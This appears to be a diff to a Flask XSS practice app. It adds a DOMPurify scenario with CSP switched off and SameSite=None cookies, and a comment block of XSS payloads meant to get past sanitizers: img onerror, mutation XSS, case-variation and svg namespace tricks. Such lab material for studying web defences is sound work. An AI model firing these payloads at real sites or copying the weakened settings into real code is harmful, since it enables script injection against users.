@@ -17,7 +17,7 @@ import time
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)  # Secret key for session management
-#app.config['SESSION_COOKIE_SECURE'] = True       # Only send over HTTPS
+app.config['SESSION_COOKIE_SECURE'] = True       # Only send over HTTPS
 #app.config['SESSION_COOKIE_HTTPONLY'] = False     # JavaScript can access cookie
 app.config['SESSION_COOKIE_SAMESITE'] = 'None'    # None, Lax, Strict
 
@@ -300,4 +300,18 @@ if __name__ == '__main__':
 
 ### SCENARIO 5.0 ###
 # DOMPurify implementation in the Base app.
-#
+# ONLY FOR /post ENDPOINT implemented here.
+# CSP switched off
+
+## In JS file
+# DOMPurify.sanitize(dirty, {
+#   USE_PROFILES: {html: true},            // default safe html profile
+#   ALLOWED_TAGS: ['b','i','em','strong','a','p','ul','li'],
+#   ALLOWED_ATTR: ['href','title']         // allow only safe attrs
+# });
+
+## EXPLOIT CODE
+# Simple img src payload: <img src=x onerror=alert(1)>
+# mXSS (mutation XSS) - Try nested tags: <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+# Case sensitivity bypass: <ImG sRc=x oNeRRoR=alert(1)>
+# Namespace confusion: <svg><script>alert(1)</script></svg>
